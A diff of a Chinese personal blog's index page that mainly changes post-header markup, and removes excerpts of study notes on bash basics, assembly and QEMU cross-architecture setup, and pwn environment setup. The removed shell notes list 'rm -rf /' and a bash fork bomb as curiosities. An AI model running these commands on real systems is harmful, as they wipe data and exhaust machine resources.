+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ha0-y.github.io/2023/06/10/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Ha0Y">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="personal blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/06/10/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">汇编学习</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-06-10 19:50:08" itemprop="dateCreated datePublished" datetime="2023-06-10T19:50:08+08:00">2023-06-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-09-01 17:33:59" itemprop="dateModified" datetime="2023-09-01T17:33:59+08:00">2023-09-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categorievariants/asm/" itemprop="url" rel="index"><span itemprop="name">asm</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>11 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>基本的汇编学习。</p>
 </blockquote>
-<h3 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h3><ul>
-<li>如何利用存在的工具使我们开发更加高效，以及如何更好的利用我们的计算机，这是这门课主要解决的问题。</li>
-</ul>
-<h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><ul>
-<li><p>讲述了Linux Shell.主要是bash</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell是运行在终端中的文本互动程序，bash（GNU Bourne-Again Shell）是最常用的一种shell。是当前大多数Linux发行版的默认Shell。</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>日期</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">date</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>打印</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>路径列表</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当我们执行一些命令时，会遍历PATH寻找；比如说使用 /bin/echo 时只需在终端输入 echo 就行</span></span><br><span class="line"><span class="comment"># `:` 分隔</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>寻找命令的路径</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">which</span> <span class="built_in">echo</span></span><br><span class="line">/usr/bin/echo</span><br><span class="line"></span><br><span class="line"><span class="comment"># whereis可以寻找到 原始代码、二进制文件，或是帮助文件</span></span><br><span class="line">$ whereis bash</span><br><span class="line">bash: /usr/bin/bash /usr/share/man/man1/bash.1.gz</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>目录</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># change dir</span></span><br><span class="line">$ <span class="built_in">cd</span> /home/username</span><br><span class="line"></span><br><span class="line"><span class="comment"># `..` 代表上一级目录。`.` 代表当前目录 </span></span><br><span class="line">$ <span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="comment"># `-`  当前目录和之前目录下切换</span></span><br><span class="line">$ <span class="built_in">cd</span> /mnt</span><br><span class="line">$ <span class="built_in">cd</span> /home</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/mnt</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/home</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/mnt</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有趣的一点是，`..`使用过多的情况。`/`目录没有上一级，最高只能到 `/`</span></span><br><span class="line">$ ../../../../../../bin/date</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>文件操作</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  list: 列出指定目录下所有的文件，默认当前目录</span></span><br><span class="line">$ <span class="built_in">ls</span> </span><br><span class="line">test.txt</span><br><span class="line">$ <span class="built_in">ls</span> /</span><br><span class="line">lib root home ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移动文件位置 move</span></span><br><span class="line">$ mov test.txt /tmp</span><br><span class="line">$ <span class="built_in">ls</span> /tmp</span><br><span class="line">test.txt</span><br><span class="line"><span class="comment"># 重命名</span></span><br><span class="line">$ <span class="built_in">cd</span> /tmp</span><br><span class="line">$ mov test.txt tmp.txt</span><br><span class="line">$ <span class="built_in">ls</span> </span><br><span class="line">tmp.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制 copy</span></span><br><span class="line">$ <span class="built_in">cp</span> tmp.txt tmp1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line">$ <span class="built_in">rm</span> tmp1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个文件</span></span><br><span class="line">$ <span class="built_in">touch</span> tmp2.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line">$ <span class="built_in">mkdir</span> tmpdir</span><br><span class="line">$ <span class="built_in">rmdir</span> <span class="comment"># rm -r 也行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件所有内容</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt</span><br><span class="line">hello world</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件开头结尾，默认10行</span></span><br><span class="line">$ <span class="built_in">head</span> test.txt</span><br><span class="line">$ <span class="built_in">tail</span> test.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat 重定向</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt &gt; tmp.txt   <span class="comment"># 如果没有就创建tmp.txt.</span></span><br><span class="line">$ <span class="built_in">cat</span> &lt; text.txt &gt; tmp.txt <span class="comment"># 同上</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt &gt;&gt; tmp.txt  <span class="comment"># &gt; 会清除原先内容。&gt;&gt; 代表append，追加而不清除</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>命令参数和帮助文档</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一般命令也存在参数，一般为 -?</span></span><br><span class="line">$ <span class="built_in">ls</span> -l  /home</span><br><span class="line"><span class="comment"># d: dir rwx: 权限Read, Write, eXecute(也代表是否能够访问此目录)。</span></span><br><span class="line"><span class="comment"># 从前到后: owner权限 group权限 其余用户权限 owner group size date dir_name</span></span><br><span class="line">drwxr-x--- 27 user user 4096 Jun 21 14:42 user  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查帮助文档，q退出。manual pages</span></span><br><span class="line">$ man <span class="built_in">ls</span> </span><br><span class="line"> -l     use a long listing format</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>管道：左侧的输出作为右侧的输入</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> / | <span class="built_in">tail</span> -n 1 <span class="comment"># -n 1 最后一行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有时候给root权限文件写入时，比如sudo echo 123 &gt; tmp.txt会报错，可用以下命令</span></span><br><span class="line">$ <span class="built_in">echo</span> 123 | sudo <span class="built_in">tee</span> tmp.txt</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>root user: 超级管理员。尽量少用，在运行错误的程序时会破坏计算机。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用户使用root权限</span></span><br><span class="line">$ sudo &lt;commond&gt;</span><br><span class="line"></span><br><span class="line">$ sudo su</span><br><span class="line">password: xxx</span><br><span class="line">root<span class="comment"># `#` 代表root 权限 </span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>/sys</code> 文件夹：各种内核参数，显示设备的状态。linux系统将其视为文件暴漏给用户，意味着我们可以操作从而控制某些设备</p>
-</li>
-<li><p>有趣的命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删库跑路，无需确认强制删除所有的文件</span></span><br><span class="line">$ <span class="built_in">rm</span> -rf /</span><br><span class="line"></span><br><span class="line"><span class="comment"># fork 炸弹, 会耗尽电脑资源</span></span><br><span class="line">$ :()&#123; :|:&amp; &#125;;:  <span class="comment"># 理解为一个函数递归调用 `:` 为函数名</span></span><br><span class="line">:() &#123;</span><br><span class="line">	: | :&amp;</span><br><span class="line">&#125;;</span><br><span class="line">:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于ls打错频率比较高，会出现一个动画(火车)</span></span><br><span class="line">sl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># cowsay 打印一段话 cowthink 类似，但是think</span></span><br><span class="line">cowsay <span class="string">&quot;nb&quot;</span></span><br><span class="line">	-l 查看动物，需要安装</span><br><span class="line">	-f 指定动物</span><br><span class="line"> ____</span><br><span class="line">&lt; nb &gt;</span><br><span class="line"> ----</span><br><span class="line">        \   ^__^</span><br><span class="line">         \  (oo)\_______</span><br><span class="line">            (__)\       )\/\</span><br><span class="line">                ||----w |</span><br><span class="line">                ||     ||</span><br><span class="line"></span><br><span class="line"><span class="comment"># figlet 字符字  toilet类似 </span></span><br><span class="line">figlet love</span><br><span class="line"> <span class="string">&quot;&quot;</span><span class="comment">#</span></span><br><span class="line">   <span class="comment">#     mmm   m   m   mmm</span></span><br><span class="line">   <span class="comment">#    #&quot; &quot;#  &quot;m m&quot;  #&quot;  #</span></span><br><span class="line">   <span class="comment">#    #   #   #m#   #&quot;&quot;&quot;&quot;</span></span><br><span class="line">   <span class="string">&quot;mm  &quot;</span><span class="comment">#m#&quot;    #    &quot;#mm&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印一堆信息和logo，装b使用</span></span><br><span class="line">neofetch</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>现代化的命令：开发者使用rust写了很多更加现代的命令，可以替代一些老命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exa  =&gt;  <span class="built_in">ls</span></span><br><span class="line">bat  =&gt;  <span class="built_in">cat</span> </span><br></pre></td></tr></table></figure></li>
-</ul>
-<h4 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h4><ul>
-<li>shell, console, terminal?<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="lectrue2-shell-script"><a href="#lectrue2-shell-script" class="headerlink" title="lectrue2: shell script"></a>lectrue2: shell script</h2></div><a class="article-more button is-small is-size-7" href="/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/#more">阅读更多</a></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-06-10T11:50:08.095Z" title="2023/6/10 19:50:08">2023-06-10</time>发表</span><span class="level-item"><time dateTime="2023-06-21T06:02:22.019Z" title="2023/6/21 14:02:22">2023-06-21</time>更新</span><span class="level-item"><a class="link-muted" href="/categorievariants/asm/">asm</a></span><span class="level-item">15 分钟读完 (大约2248个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/06/10/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/">汇编学习</a></p><div class="content"><ul>
-<li><p>基本的汇编学习。</p>
-</li>
-<li><p>学习目标：首先能看懂。然后尝试编写 <code>shellcode</code>。</p>
-</li>
-<li><p>个人习惯小写指令。</p>
-</li>
-<li><p><code>little-endian</code></p>
-</li>
-<li><p>常见的汇编格式</p>
-<ul>
-<li>Intel格式。</li>
-<li>AT&amp;T，实际使用也很常见(Linux中默认的格式)</li>
-</ul>
-</li>
-<li><p>部分名词</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ISA: Instruction Set Architecture, 指令集架构</span><br><span class="line">RISC: Reduced Instruction Set Computer, 精简指令集计算机</span><br><span class="line">CISC: Complex Instruction Set Computer, 复杂指令集计算机</span><br><span class="line">ABI: application binary interface</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="环境问题"><a href="#环境问题" class="headerlink" title="环境问题"></a>环境问题</h2><ul>
-<li><p>本机 linux: ubuntu &amp;&amp; kali virtual machine；CPU: AMD。</p>
-<ul>
-<li>无法直接运行 <code>arm</code> 和 <code>mips</code> 架构的程序</li>
-</ul>
-</li>
-<li><p>arm可以使用手机终端 <a target="_blank" rel="noopener" href="https://termux.dev/en/">Termux</a> 进行运行。或者购买云服务器?</p>
-</li>
-</ul>
-<h3 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h3><ul>
-<li><p>基本环境 <code>user mode+kernel mode</code>。 </p>
-<ul>
-<li>运行程序只需要一个<code>qemu-user</code> 就行，启动系统需要 <code>qemu-system-xxx</code></li>
-<li>甚至可以 <code>qemu-system</code> 跑kernel，然后跑程序😂<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># qemu user用户态 system启动内核镜像</span></span><br><span class="line">sudo apt install qemu-user</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li><p>arm 环境</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gun 编译工具链 + 动态链接库</span></span><br><span class="line">sudo apt list gcc* | grep arm</span><br><span class="line">sudo apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu</span><br><span class="line"></span><br><span class="line"><span class="comment"># optional: qemu arm system mode</span></span><br><span class="line">sudo apt list  <span class="string">&quot;qemu*&quot;</span> <span class="comment"># 寻找对用的arch</span></span><br><span class="line">sudo apt install qemu-system-arm qemu-system-aarch64</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>mips 环境.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gun 编译工具链</span></span><br><span class="line">sudo apt install gcc-mips-linux-gnu gcc-mips64-linux-gnuabi64 gcc-mipsel-linux-gnu gcc-mips64el-linux-gnuabi64</span><br><span class="line"></span><br><span class="line"><span class="comment"># optional: qemu mips system mode, 目前没见过， user mode 应该够了</span></span><br><span class="line">sudo apt install qemu-system-mips</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>gdb</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gdb gdb-multiarch</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ul>
-<li><p>qemu-user 使用 <code>-g</code> gdb模式 确定gdb调试端口</p>
-</li>
-<li><p>qemu-system 使用 <code>-s -S  或者 -gdb tcp:1234</code> gdbserver等待连接，默认端口 <code>1234</code></p>
-</li>
-<li><p>编程测试</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hello, world!&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>寻找动态链接库。<code>lib-&gt;/usr/lib</code> 的链接</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -al /usr/lib | grep arm  <span class="comment"># aarch64 mips...</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>arm 测试，不知为什么，测试时 <code>-g</code>放前面才成功</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译</span></span><br><span class="line">arm-linux-gnueabi-gcc hello.c -o helloarm -g</span><br><span class="line">aarch64-linux-gnu-gcc hello.c -o helloaarch -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">$ qemu-arm -L /usr/arm-linux-gnueabi ./helloarm</span><br><span class="line">$ qemu-aarch64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调试</span></span><br><span class="line">$ qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./helloarm </span><br><span class="line">$ gdb-multiarch</span><br><span class="line">gdb&gt; <span class="built_in">set</span> <span class="built_in">arch</span> arm <span class="comment"># aarch64</span></span><br><span class="line">gdb&gt; target remote localhost:1234</span><br><span class="line">xxx </span><br></pre></td></tr></table></figure>
-</li>
-<li><p>mips 测试, 与arm类似</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mips-linux-gnu-gcc hello.c -o hellomips -g</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><ul>
-<li>CISC</li>
-</ul>
-<h3 id="x86-1"><a href="#x86-1" class="headerlink" title="x86"></a>x86</h3></div><a class="article-more button is-small is-size-7" href="/2023/06/10/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/#more">阅读更多</a></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-06-05T02:16:53.446Z" title="2023/6/5 10:16:53">2023-06-05</time>发表</span><span class="level-item"><time dateTime="2023-07-28T15:25:04.276Z" title="2023/7/28 23:25:04">2023-07-28</time>更新</span><span class="level-item"><a class="link-muted" href="/categorievariants/pwn/">pwn</a></span><span class="level-item">6 分钟读完 (大约967个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/06/05/Pwn%20init/">pwn init</a></p><div class="content"><ul>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/06/10/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ha0-y.github.io/2023/06/05/Pwn%20init/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Ha0Y">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="personal blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/06/05/Pwn%20init/" class="post-title-link" itemprop="url">pwn init</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-06-05 10:16:53" itemprop="dateCreated datePublished" datetime="2023-06-05T10:16:53+08:00">2023-06-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-09-01 17:29:35" itemprop="dateModified" datetime="2023-09-01T17:29:35+08:00">2023-09-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categorievariants/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ul>
 <li>搭建一个pwn环境。</li>
 <li><code>apt</code> or <code>apt-get</code>? 虽然我使用apt出现warning,但是依然能用<ul>
 <li>在脚本中，更加推荐 <code>apt-get</code></li>
@@ -256,133 +743,305 @@
 </ul>
 </li>
 </ul>
-<h3 id="VM-or-WSL"><a href="#VM-or-WSL" class="headerlink" title="VM or WSL"></a>VM or WSL</h3><blockquote>
-<p>安装必备的应用</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/06/05/Pwn%20init/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ha0-y.github.io/2023/03/19/init-blog/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Ha0Y">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="personal blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/03/19/init-blog/" class="post-title-link" itemprop="url">init-blog</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-19 13:03:15" itemprop="dateCreated datePublished" datetime="2023-03-19T13:03:15+08:00">2023-03-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-09-01 17:34:29" itemprop="dateModified" datetime="2023-09-01T17:34:29+08:00">2023-09-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categorievariants/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>441</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
